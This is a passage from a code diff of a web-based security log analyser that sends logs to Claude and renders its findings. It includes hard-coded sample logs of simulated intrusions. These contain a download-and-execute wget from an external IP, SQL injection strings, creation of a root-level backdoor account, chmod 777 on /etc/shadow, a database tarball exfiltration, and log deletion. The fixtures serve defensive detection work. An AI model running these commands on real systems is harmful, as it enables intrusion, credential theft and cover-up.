+      'Apr 17 02:14:11 web-prod-04 kernel: [284520.443298] oom_reaper: reaped process 18422 (java), now anon-rss:0kB, file-rss:0kB',
+      'Apr 17 02:14:12 web-prod-04 systemd[1]: tomcat.service: A process of this unit has been killed by the OOM killer.',
+      'Apr 17 02:14:14 web-prod-04 systemd[1]: tomcat.service: Failed with result \'oom-kill\'.',
+      'Apr 17 02:18:42 web-prod-04 kernel: [284791.028104] EXT4-fs error (device sda1): ext4_journal_check_start:83: Detected aborted journal',
+      'Apr 17 02:18:42 web-prod-04 kernel: [284791.028110] EXT4-fs (sda1): Remounting filesystem read-only',
+      'Apr 17 02:18:55 web-prod-04 kernel: [284804.119883] watchdog: BUG: soft lockup - CPU#2 stuck for 22s! [kworker/2:1:148]',
+      'Apr 17 02:19:31 web-prod-04 systemd[1]: Starting Reboot...',
+      'Apr 17 02:19:31 web-prod-04 systemd-shutdown[1]: Sending SIGTERM to remaining processes...',
+      '-- Reboot --',
+      'Apr 17 02:21:08 web-prod-04 systemd[1]: Startup finished in 4.812s (kernel) + 12.4s (userspace) = 17.21s.',
+      'Apr 17 02:21:14 web-prod-04 systemd[1]: nginx.service: Failed to start: Address already in use',
+      'Apr 17 02:21:14 web-prod-04 systemd[1]: nginx.service: Failed with result \'exit-code\'.'
+    ].join('\n'),
+
+    auth: [
+      'Apr 17 03:42:11 bastion-01 sshd[24881]: Failed password for root from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:13 bastion-01 sshd[24881]: Failed password for root from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:15 bastion-01 sshd[24881]: Failed password for root from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:18 bastion-01 sshd[24881]: Failed password for root from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:20 bastion-01 sshd[24881]: Failed password for root from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:22 bastion-01 sshd[24881]: Failed password for root from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:25 bastion-01 sshd[24881]: Failed password for admin from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:27 bastion-01 sshd[24881]: Failed password for admin from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:31 bastion-01 sshd[24881]: Failed password for ubuntu from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:34 bastion-01 sshd[24881]: Failed password for ubuntu from 185.220.101.47 port 53124 ssh2',
+      'Apr 17 03:42:38 bastion-01 sshd[24884]: Accepted password for ubuntu from 185.220.101.47 port 53198 ssh2',
+      'Apr 17 03:42:38 bastion-01 sshd[24884]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)',
+      'Apr 17 03:42:41 bastion-01 systemd-logind[882]: New session 4827 of user ubuntu.',
+      'Apr 17 03:43:02 bastion-01 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash',
+      'Apr 17 03:43:02 bastion-01 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=1000)',
+      'Apr 17 03:43:14 bastion-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.47/x86_64.elf -O /tmp/.cache',
+      'Apr 17 03:43:18 bastion-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/.cache',
+      'Apr 17 03:43:21 bastion-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/tmp/.cache',
+      'Apr 17 03:43:25 bastion-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/passwd ubuntu',
+      'Apr 17 03:44:02 bastion-01 useradd[24921]: new user: name=svc_backup, UID=0, GID=0, home=/var/lib/svc_backup, shell=/bin/bash'
+    ].join('\n'),
+
+    network: [
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44218 DPT=21 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44219 DPT=22 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44220 DPT=23 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44221 DPT=25 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44222 DPT=53 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44223 DPT=80 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44224 DPT=110 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44225 DPT=143 SYN',
+      '2026-04-17T04:11:02Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44226 DPT=443 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44227 DPT=445 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44228 DPT=993 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44229 DPT=995 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44230 DPT=1433 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44231 DPT=3306 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44232 DPT=3389 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44233 DPT=5432 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44234 DPT=5900 SYN',
+      '2026-04-17T04:11:03Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44235 DPT=6379 SYN',
+      '2026-04-17T04:11:04Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44236 DPT=8080 SYN',
+      '2026-04-17T04:11:04Z fw-edge-01 IN=eth0 OUT= SRC=92.118.39.214 DST=10.0.4.18 PROTO=TCP SPT=44237 DPT=27017 SYN',
+      '2026-04-17T04:14:38Z fw-edge-01 conn established SRC=45.155.205.233 DST=10.0.4.22 PROTO=TCP DPT=443 BYTES=8821447 DURATION=42s',
+      '2026-04-17T04:15:21Z fw-edge-01 conn established SRC=45.155.205.233 DST=10.0.4.22 PROTO=TCP DPT=443 BYTES=14882910 DURATION=58s',
+      '2026-04-17T04:16:09Z fw-edge-01 conn established SRC=45.155.205.233 DST=10.0.4.22 PROTO=TCP DPT=443 BYTES=22118402 DURATION=71s',
+      '2026-04-17T04:17:02Z fw-edge-01 conn established SRC=45.155.205.233 DST=10.0.4.22 PROTO=TCP DPT=443 BYTES=31449281 DURATION=88s',
+      '2026-04-17T04:17:55Z fw-edge-01 ALERT egress-volume host=10.0.4.22 dest=45.155.205.233 24h-bytes=4.2GB baseline=120MB'
+    ].join('\n'),
+
+    application: [
+      '10.0.2.14 - - [17/Apr/2026:05:02:11 +0000] "GET /api/products?id=42 HTTP/1.1" 200 1842 "-" "Mozilla/5.0"',
+      '10.0.2.14 - - [17/Apr/2026:05:02:13 +0000] "GET /api/products?id=43 HTTP/1.1" 200 1701 "-" "Mozilla/5.0"',
+      '203.0.113.78 - - [17/Apr/2026:05:03:02 +0000] "GET /api/products?id=1\' OR \'1\'=\'1 HTTP/1.1" 500 247 "-" "sqlmap/1.7.2#stable"',
+      '203.0.113.78 - - [17/Apr/2026:05:03:03 +0000] "GET /api/products?id=1\' UNION SELECT username,password FROM users-- HTTP/1.1" 500 247 "-" "sqlmap/1.7.2#stable"',
+      '203.0.113.78 - - [17/Apr/2026:05:03:04 +0000] "GET /api/products?id=1\';DROP TABLE users;-- HTTP/1.1" 500 247 "-" "sqlmap/1.7.2#stable"',
+      '203.0.113.78 - - [17/Apr/2026:05:03:05 +0000] "GET /api/products?id=1\' AND SLEEP(5)-- HTTP/1.1" 500 247 "-" "sqlmap/1.7.2#stable"',
+      '2026-04-17 05:03:05 ERROR [http-nio-8080-exec-12] o.s.web.servlet.DispatcherServlet - SQLException: You have an error in your SQL syntax near \'OR \'1\'=\'1\' at line 1',
+      '2026-04-17 05:03:05 ERROR [http-nio-8080-exec-12] c.app.api.ProductController - Unhandled exception: org.hibernate.exception.SQLGrammarException',
+      '203.0.113.78 - - [17/Apr/2026:05:03:06 +0000] "GET /api/products?id=1\' OR \'1\'=\'1 HTTP/1.1" 429 89 "-" "sqlmap/1.7.2#stable"',
+      '203.0.113.78 - - [17/Apr/2026:05:03:06 +0000] "GET /api/products?id=1\' OR \'1\'=\'1 HTTP/1.1" 429 89 "-" "sqlmap/1.7.2#stable"',
+      '203.0.113.78 - - [17/Apr/2026:05:03:07 +0000] "GET /api/products?id=1\' OR \'1\'=\'1 HTTP/1.1" 429 89 "-" "sqlmap/1.7.2#stable"',
+      '2026-04-17 05:03:07 WARN  [rate-limiter] c.app.middleware.RateLimit - Threshold exceeded for 203.0.113.78 (218 req/min, limit=60)',
+      '203.0.113.78 - - [17/Apr/2026:05:03:42 +0000] "POST /admin/login HTTP/1.1" 500 1284 "-" "sqlmap/1.7.2#stable"',
+      '2026-04-17 05:03:42 ERROR [http-nio-8080-exec-9] c.app.security.AuthFilter - NullPointerException at AuthFilter.java:147',
+      '2026-04-17 05:03:42 ERROR [http-nio-8080-exec-9] o.a.c.c.C.[.[.[/].[dispatcherServlet] - Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception',
+      '10.0.2.14 - - [17/Apr/2026:05:04:01 +0000] "GET /healthz HTTP/1.1" 200 12 "-" "kube-probe/1.28"',
+      '203.0.113.78 - - [17/Apr/2026:05:04:11 +0000] "GET /.env HTTP/1.1" 404 153 "-" "curl/7.81.0"',
+      '203.0.113.78 - - [17/Apr/2026:05:04:11 +0000] "GET /.git/config HTTP/1.1" 404 153 "-" "curl/7.81.0"',
+      '203.0.113.78 - - [17/Apr/2026:05:04:12 +0000] "GET /wp-admin/ HTTP/1.1" 404 153 "-" "curl/7.81.0"'
+    ].join('\n'),
+
+    audit: [
+      'type=USER_ACCT msg=audit(1745558212.441:8821): pid=14228 uid=0 auid=1000 ses=482 msg=\'op=PAM:accounting acct="ubuntu" exe="/usr/bin/sudo" hostname=? addr=? terminal=pts/0 res=success\'',
+      'type=ADD_USER msg=audit(1745558244.012:8829): pid=14302 uid=0 auid=1000 ses=482 msg=\'op=adding-user id=0 acct="svc_backup" exe="/usr/sbin/useradd" hostname=bastion-01 addr=? terminal=pts/0 res=success\'',
+      'type=ADD_GROUP msg=audit(1745558244.014:8830): pid=14302 uid=0 auid=1000 ses=482 msg=\'op=adding-group acct="svc_backup" exe="/usr/sbin/useradd" res=success\'',
+      'type=USER_MGMT msg=audit(1745558252.881:8841): pid=14318 uid=0 auid=1000 ses=482 msg=\'op=add-to-group group="sudo" acct="svc_backup" exe="/usr/sbin/usermod" res=success\'',
+      'type=PATH msg=audit(1745558271.117:8855): item=0 name="/etc/shadow" inode=2622157 dev=fd:01 mode=0100640 ouid=0 ogid=42 rdev=00:00',
+      'type=SYSCALL msg=audit(1745558271.117:8855): arch=c000003e syscall=2 success=yes exit=3 a0=7ffd44a1c8b0 a1=0 a2=0 a3=0 items=1 ppid=14101 pid=14401 auid=1000 uid=0 gid=0 euid=0 comm="cat" exe="/usr/bin/cat" key="shadow_access"',
+      'type=PATH msg=audit(1745558288.342:8862): item=0 name="/etc/shadow" inode=2622157 dev=fd:01 mode=0100640 ouid=0 ogid=42 rdev=00:00',
+      'type=SYSCALL msg=audit(1745558288.342:8862): arch=c000003e syscall=90 success=yes exit=0 a0=7ffd0c114a30 a1=1ff a2=0 items=1 ppid=14101 pid=14418 auid=1000 uid=0 gid=0 comm="chmod" exe="/usr/bin/chmod" key="perm_change"',
+      'type=USER_CMD msg=audit(1745558288.342:8862): pid=14418 uid=0 auid=1000 ses=482 msg=\'cwd="/root" cmd=/bin/chmod 777 /etc/shadow terminal=pts/0 res=success\'',
+      'type=CONFIG_CHANGE msg=audit(1745558301.911:8870): auid=1000 ses=482 op=remove_rule key="passwd_changes" list=4 res=1',
+      'type=DAEMON_ROTATE msg=audit(1745558311.020:8881): op=stop auditd ver=3.0.7 format=enriched kernel=5.15.0 auid=1000 pid=14501 res=success',
+      'type=USER_CMD msg=audit(1745558320.448:8890): pid=14512 uid=0 auid=1000 ses=482 msg=\'cwd="/root" cmd=/usr/bin/crontab -e terminal=pts/0 res=success\'',
+      'type=PATH msg=audit(1745558342.119:8901): item=0 name="/var/log/auth.log" mode=0100640 ouid=0 ogid=4',
+      'type=SYSCALL msg=audit(1745558342.119:8901): arch=c000003e syscall=87 success=yes exit=0 comm="rm" exe="/usr/bin/rm" key="logfile_delete"'
+    ].join('\n'),
+
+    mixed: [
+      '# --- AUTH (auth.log) ---',
+      'Apr 17 06:08:11 db-prod-02 sshd[8821]: Failed password for postgres from 91.240.118.222 port 41882 ssh2',
+      'Apr 17 06:08:14 db-prod-02 sshd[8821]: Failed password for postgres from 91.240.118.222 port 41882 ssh2',
+      'Apr 17 06:08:17 db-prod-02 sshd[8821]: Failed password for postgres from 91.240.118.222 port 41882 ssh2',
+      'Apr 17 06:08:21 db-prod-02 sshd[8821]: Failed password for postgres from 91.240.118.222 port 41882 ssh2',
+      'Apr 17 06:08:24 db-prod-02 sshd[8821]: Failed password for postgres from 91.240.118.222 port 41882 ssh2',
+      'Apr 17 06:08:28 db-prod-02 sshd[8825]: Accepted publickey for postgres from 91.240.118.222 port 41918 ssh2: RSA SHA256:9f:84:...',
+      'Apr 17 06:08:31 db-prod-02 sudo:   postgres : TTY=pts/1 ; PWD=/var/lib/postgresql ; USER=root ; COMMAND=/bin/bash',
+      '',
+      '# --- APPLICATION (app.log + access.log) ---',
+      '91.240.118.222 - - [17/Apr/2026:06:09:02 +0000] "GET /api/users?id=1\' OR \'1\'=\'1 HTTP/1.1" 500 247 "-" "python-requests/2.31"',
+      '2026-04-17 06:09:02 ERROR [http-nio-8080-exec-3] c.app.api.UserController - SQLGrammarException: You have an error in your SQL syntax',
+      '91.240.118.222 - - [17/Apr/2026:06:09:04 +0000] "GET /api/users?id=1\' UNION SELECT password,email FROM users-- HTTP/1.1" 200 184221 "-" "python-requests/2.31"',
+      '2026-04-17 06:09:04 WARN  [audit] c.app.security.QueryAudit - Anomalous response size: 184221 bytes for /api/users (median=842 bytes)',
+      '',
+      '# --- NETWORK (firewall) ---',
+      '2026-04-17T06:09:48Z fw-edge-01 conn established SRC=10.0.5.22 DST=91.240.118.222 PROTO=TCP DPT=443 BYTES=412882910 DURATION=212s',
+      '2026-04-17T06:10:14Z fw-edge-01 ALERT egress-volume host=db-prod-02(10.0.5.22) dest=91.240.118.222 1h-bytes=1.8GB baseline=8MB',
+      '2026-04-17T06:10:21Z fw-edge-01 conn established SRC=10.0.5.22 DST=91.240.118.222 PROTO=TCP DPT=443 BYTES=298441207 DURATION=188s',
+      '',
+      '# --- AUDIT ---',
+      'type=USER_CMD msg=audit(1745561432.118:9921): pid=18402 uid=0 auid=1001 ses=601 msg=\'cwd="/root" cmd=/usr/bin/tar czf /tmp/db.tgz /var/lib/postgresql/14/main terminal=pts/1 res=success\'',
+      'type=SYSCALL msg=audit(1745561518.882:9940): arch=c000003e syscall=87 success=yes exit=0 comm="rm" exe="/usr/bin/rm" key="logfile_delete" cmd="rm /var/log/auth.log /var/log/syslog"'
+    ].join('\n')
+  };
+
+  /* ===== Load Sample Button ===== */
+  (function () {
+    const btn = document.getElementById('btn-load-sample');
+    const ta = document.getElementById('log-input');
+    btn.addEventListener('click', () => {
+      const type = (window.__getLogType && window.__getLogType()) || 'system';
+      const sample = SAMPLE_LOGS[type] || SAMPLE_LOGS.system;
+      ta.value = sample;
+      ta.dispatchEvent(new Event('input', { bubbles: true }));
+      ta.scrollTop = 0;
+      ta.focus();
+    });
+  })();
+
+  /* ===== Analyze Logs (Claude API) ===== */
+  window.lastAnalysis = null;
+
+  (function () {
+    const MAX_LOG_CHARS = 50000;
+    const API_URL = 'https://api.anthropic.com/v1/messages';
+    const MODEL = 'claude-sonnet-4-20250514';
+
+    const SYSTEM_PROMPT = [
+      'You are an expert security analyst and incident responder with deep experience in log analysis, threat hunting, and digital forensics across Linux, Windows, network, and application environments.',
+      '',
+      'Your job is to examine the logs the user provides and identify anomalies, suspicious patterns, and potential security incidents. You must consider the declared log type, sensitivity level, known-safe IPs, known admin accounts, and the user\'s timezone when evaluating events.',
+      '',
+      'For every request, you MUST respond with a SINGLE valid JSON object and nothing else. No prose before or after. No markdown fences. No explanation. Just raw JSON that strictly matches this schema:',
+      '',
+      '{',
+      '  "summary": {',
+      '    "totalEvents": <integer>,',
+      '    "anomaliesFound": <integer>,',
+      '    "highestSeverity": "none" | "low" | "medium" | "high" | "critical",',
+      '    "timeRange": "<human-readable range, e.g. 2026-04-17 02:14 → 02:21 UTC>",',
+      '    "oneLineVerdict": "<single sentence headline of what is going on>"',
+      '  },',
+      '  "anomalies": [',
+      '    {',
+      '      "id": "<stable short id, e.g. A1, A2>",',
+      '      "title": "<short human title>",',
+      '      "severity": "low" | "medium" | "high" | "critical",',
+      '      "category": "<e.g. brute-force, privilege-escalation, data-exfiltration, sql-injection, recon, persistence, system-failure, misconfiguration>",',
+      '      "evidence": ["<raw log line or paraphrase>", "..."],',
+      '      "whatHappened": "<plain English, 1–3 sentences>",',
+      '      "whyItMatters": "<risk / potential impact in plain English>",',
+      '      "recommendedAction": "<concrete next step for a responder>",',
+      '      "confidence": "low" | "medium" | "high"',
+      '    }',
+      '  ],',
+      '  "ipIntelligence": [',
+      '    {',
+      '      "ip": "<ip address>",',
+      '      "role": "source" | "destination" | "both",',
+      '      "classification": "known-safe" | "internal" | "external-suspicious" | "external-unknown" | "malicious-indicator",',
+      '      "activityCount": <integer>,',
+      '      "notes": "<what this IP did across the logs>"',
+      '    }',
+      '  ],',
+      '  "narrativeReport": {',
+      '    "whatWeFound": "<multi-paragraph plain English prose describing what happened. Separate paragraphs with \\n\\n. No markdown, no headings.>",',
+      '    "mostCriticalIssues": ["<concise bullet>", "<concise bullet>"],',
+      '    "timelineOfEvents": "<multi-paragraph prose walking through the sequence of events in chronological order. Separate paragraphs with \\n\\n.>",',
+      '    "recommendedImmediateActions": ["<action 1, highest priority first>", "<action 2>", "<action 3>"],',
+      '    "whatToMonitorGoingForward": ["<indicator or metric to keep watching>", "<another>"]',
+      '  }',
+      '}',
+      '',
+      'Rules:',
+      '- ALWAYS return that exact schema. If a section has nothing to report, return an empty array (or a summary with anomaliesFound=0 and highestSeverity="none").',
+      '- Treat known-safe IPs and admin accounts as lower-suspicion by default, but still flag them if behavior is clearly abnormal.',
+      '- Scale aggressiveness with sensitivity: "standard" only flags clear issues, "moderate" includes notable oddities, "high" surfaces even weak signals.',
+      '- Never invent log lines that were not provided. Evidence must come from the input.',
+      '- Never include API keys, secrets, or any content outside the JSON object.',
+      '- Output must be parseable by JSON.parse() on the first try.'
+    ].join('\n');
+
+    const btnAnalyze = document.getElementById('btn-analyze');
+    const btnSample = document.getElementById('btn-load-sample');
+    const outputPanel = document.getElementById('output-panel');
+    const outputBody = outputPanel.querySelector('.panel-body');
+
+    const LOADING_MESSAGES = [
+      'Reading log structure...',
+      'Identifying anomaly patterns...',
+      'Evaluating threat severity...',
+      'Generating plain English report...'
+    ];
+
+    let overlayEl = null;
+    let rotateTimer = null;
+
+    function showOverlay() {
+      hideOverlay();
+      overlayEl = document.createElement('div');
+      overlayEl.className = 'spinner-overlay';
+      overlayEl.innerHTML = `
+        <div class="spinner" aria-hidden="true"></div>
+        <div class="spinner-msg" id="spinner-msg">${LOADING_MESSAGES[0]}</div>
+        <div class="spinner-sub">Analyzing with Claude…</div>
+      `;
+      outputPanel.appendChild(overlayEl);
+
+      let idx = 0;
+      const msgEl = overlayEl.querySelector('#spinner-msg');
+      rotateTimer = setInterval(() => {
+        idx = (idx + 1) % LOADING_MESSAGES.length;
+        msgEl.style.opacity = '0';
+        setTimeout(() => {
+          msgEl.textContent = LOADING_MESSAGES[idx];
+          msgEl.style.opacity = '1';
+        }, 200);
+      }, 2000);
+    }
+
+    function hideOverlay() {
+      if (rotateTimer) { clearInterval(rotateTimer); rotateTimer = null; }
+      if (overlayEl && overlayEl.parentNode) overlayEl.parentNode.removeChild(overlayEl);
+      overlayEl = null;
+    }
+
+    function setLoading(isLoading) {
+      btnAnalyze.disabled = isLoading;
+      btnSample.disabled = isLoading;
+      btnAnalyze.classList.toggle('is-loading', isLoading);
+      if (isLoading) showOverlay();
+      else hideOverlay();
+    }
+
+    function clearOutput() {
+      outputBody.classList.remove('placeholder-body');
+      outputBody.innerHTML = '';
+    }
+
+    function renderPlaceholderResult() {
+      clearOutput();
+      const box = document.createElement('div');
+      box.className = 'result-placeholder';
+      box.textContent = '✅ Analysis complete';
+      outputBody.appendChild(box);
+
+      const anomalies = (window.lastAnalysis && Array.isArray(window.lastAnalysis.anomalies))
+        ? window.lastAnalysis.anomalies : [];
+
+      const timeline = buildTimeline(anomalies);
+      if (timeline) outputBody.appendChild(timeline);
+
+      activeIpFilter = null;
+
+      if (anomalies.length > 0) {
+        outputBody.appendChild(buildFindingsTable(anomalies));
+      }
+
+      const ipList = (window.lastAnalysis && Array.isArray(window.lastAnalysis.ipIntelligence))
+        ? window.lastAnalysis.ipIntelligence : [];
+      if (ipList.length > 0) {
+        outputBody.appendChild(buildIpIntelligence(ipList));
+      }
+
+      const narrative = window.lastAnalysis && window.lastAnalysis.narrativeReport;
+      const narrativeEl = buildNarrative(narrative);
+      if (narrativeEl) outputBody.appendChild(narrativeEl);
+    }
+
+    /* ===== IP Intelligence ===== */
+    let activeIpFilter = null;
+
+    function normalizeIpClassification(c) {
+      return String(c || '').toLowerCase().trim();
+    }
+
+    function ipLabel(classification) {
+      const c = normalizeIpClassification(classification);
+      if (c === 'internal' || c === 'known-safe') return { text: 'Internal', cls: 'ip-label-internal' };
+      if (c === 'external-suspicious' || c === 'external-unknown' || c === 'malicious-indicator') {
+        return { text: 'External', cls: 'ip-label-external' };
+      }
+      return { text: 'Unknown', cls: 'ip-label-unknown' };
+    }
+
+    function isSuspiciousIp(classification) {
+      const c = normalizeIpClassification(classification);
+      return c === 'external-suspicious' || c === 'malicious-indicator';
+    }
+
+    function applyIpFilter() {
+      const table = document.querySelector('.findings-table');
+      if (!table) return;
+      const rows = table.querySelectorAll('tbody tr');
+      rows.forEach(r => {
+        if (!activeIpFilter) {
+          r.style.display = '';
+          return;
+        }
+        const text = r.textContent || '';
+        r.style.display = text.includes(activeIpFilter) ? '' : 'none';
+      });
+    }
+
+    function updateIpFilterUi() {
+      document.querySelectorAll('.ip-clickable').forEach(btn => {
+        btn.classList.toggle('is-active', btn.dataset.ip === activeIpFilter);
+      });
+      document.querySelectorAll('.ip-table tbody tr').forEach(r => {
+        r.classList.toggle('ip-active', r.dataset.ip && r.dataset.ip === activeIpFilter);
+      });
+      const indicator = document.querySelector('.ip-filter-indicator');
+      if (indicator) {
+        if (activeIpFilter) {
+          indicator.classList.add('visible');
+          const label = indicator.querySelector('.filter-ip-value');
+          if (label) label.textContent = activeIpFilter;
+        } else {
+          indicator.classList.remove('visible');
+        }
+      }
+    }
+
+    function toggleIpFilter(ip) {
+      activeIpFilter = activeIpFilter === ip ? null : ip;
+      applyIpFilter();
+      updateIpFilterUi();
+    }
+
+    function buildIpIntelligence(ips) {
+      const panel = document.createElement('section');
+      panel.className = 'ip-panel';
+
+      const header = document.createElement('div');
+      header.className = 'ip-panel-header';
+      header.innerHTML = `
+        <div class="ip-panel-title">
+          <span class="title-icon">🌐</span>
+          <span>IP Intelligence</span>
+        </div>
+        <div class="ip-filter-indicator" role="status" aria-live="polite">
+          <span>Filtering findings by</span>
+          <code class="filter-ip-value" style="color:var(--accent-red);font-family:var(--font-mono);"></code>
+          <button type="button" class="clear-btn">Clear</button>
+        </div>
+      `;
+      panel.appendChild(header);
+
+      const clearBtn = header.querySelector('.clear-btn');
+      clearBtn.addEventListener('click', () => {
+        activeIpFilter = null;
+        applyIpFilter();
+        updateIpFilterUi();
+      });
+
+      const wrap = document.createElement('div');
+      wrap.className = 'ip-table-wrap';
+
+      const table = document.createElement('table');
+      table.className = 'ip-table';
+      table.innerHTML = `
+        <thead>
+          <tr>
+            <th class="ip-col-ip">IP</th>
+            <th class="ip-col-count">Occurrences</th>
+            <th class="ip-col-ctx">Context</th>
+            <th class="ip-col-label">Label</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      `;
+
+      const tbody = table.querySelector('tbody');
+      ips.forEach(entry => {
+        const ip = String(entry.ip || '').trim();
+        if (!ip) return;
+        const suspicious = isSuspiciousIp(entry.classification);
+        const label = ipLabel(entry.classification);
+        const count = Number.isFinite(Number(entry.activityCount)) ? Number(entry.activityCount) : '—';
+
+        const tr = document.createElement('tr');
+        tr.dataset.ip = ip;
+        if (suspicious) tr.classList.add('ip-suspicious');
+
+        tr.innerHTML = `
+          <td class="ip-col-ip">
+            <button type="button" class="ip-clickable" data-ip="${escapeHtml(ip)}" title="Click to filter findings by this IP">
+              <span>${escapeHtml(ip)}</span>
+            </button>
+            ${suspicious ? '<span class="ip-warn-badge" title="Flagged as suspicious">⚠️ Suspicious</span>' : ''}
+          </td>
+          <td class="ip-col-count">${escapeHtml(String(count))}</td>
+          <td class="ip-col-ctx ip-notes">${escapeHtml(entry.notes || '—')}</td>
+          <td class="ip-col-label"><span class="ip-label-pill ${label.cls}">${escapeHtml(label.text)}</span></td>
+        `;
+
+        const clickBtn = tr.querySelector('.ip-clickable');
+        clickBtn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          toggleIpFilter(ip);
+        });
+
+        tbody.appendChild(tr);
+      });
+
+      wrap.appendChild(table);
+      panel.appendChild(wrap);
+      return panel;
+    }
+
+    /* ===== Narrative Report ===== */
+    function renderProseHtml(value) {
+      if (value == null) return '';
+      if (Array.isArray(value)) value = value.join('\n\n');
+      const text = String(value).trim();
+      if (!text) return '';
+      const paragraphs = text.split(/\n\s*\n/).map(p => p.trim()).filter(Boolean);
+      if (paragraphs.length === 0) return '';
+      return paragraphs.map(p => `<p>${escapeHtml(p)}</p>`).join('');
+    }
+
+    function renderListItems(value) {
+      let items = [];
+      if (Array.isArray(value)) {
+        items = value.map(v => String(v == null ? '' : v).trim()).filter(Boolean);
+      } else if (typeof value === 'string') {
+        items = value.split(/\n+/).map(s => s.replace(/^\s*[-*•\d.)\s]+/, '').trim()).filter(Boolean);
+      }
+      return items.map(i => `<li>${escapeHtml(i)}</li>`).join('');
+    }
+
+    function buildNarrativeCard(icon, title, bodyHtml) {
+      if (!bodyHtml) return null;
+      const card = document.createElement('div');
+      card.className = 'nr-card';
+      card.innerHTML = `
+        <div class="nr-card-header">
+          <div class="nr-card-icon" aria-hidden="true">${icon}</div>
+          <div class="nr-card-title">${escapeHtml(title)}</div>
+        </div>
+        <div class="nr-card-body">${bodyHtml}</div>
+      `;
+      return card;
+    }
+
+    function buildNarrative(report) {
+      if (!report) return null;
+      let rpt = report;
+      if (typeof report === 'string') {
+        rpt = { whatWeFound: report };
+      }
+      if (typeof rpt !== 'object') return null;
+
+      const whatWeFound = renderProseHtml(rpt.whatWeFound);
+      const criticalList = renderListItems(rpt.mostCriticalIssues);
+      const timelineProse = renderProseHtml(rpt.timelineOfEvents);
+      const actionsList = renderListItems(rpt.recommendedImmediateActions);
+      const monitorList = renderListItems(rpt.whatToMonitorGoingForward);
+
+      const cards = [];
+      const c1 = buildNarrativeCard('📖', 'What We Found',
+        whatWeFound ? `<div class="nr-prose">${whatWeFound}</div>` : '');
+      const c2 = buildNarrativeCard('⚠️', 'Most Critical Issues',
+        criticalList ? `<ul class="nr-list">${criticalList}</ul>` : '');
+      const c3 = buildNarrativeCard('🕐', 'Timeline of Events',
+        timelineProse ? `<div class="nr-prose">${timelineProse}</div>` : '');
+      const c4 = buildNarrativeCard('🚨', 'Recommended Immediate Actions',
+        actionsList ? `<ol class="nr-numbered">${actionsList}</ol>` : '');
+      const c5 = buildNarrativeCard('👀', 'What to Monitor Going Forward',
+        monitorList ? `<ul class="nr-list">${monitorList}</ul>` : '');
+
+      [c1, c2, c3, c4, c5].forEach(c => { if (c) cards.push(c); });
+      if (cards.length === 0) return null;
+
+      const section = document.createElement('section');
+      section.className = 'narrative-section';
+
+      const heading = document.createElement('div');
+      heading.className = 'narrative-heading';
+      heading.innerHTML = `<i class="fa-solid fa-book-open"></i><span>Narrative Report</span>`;
+      section.appendChild(heading);
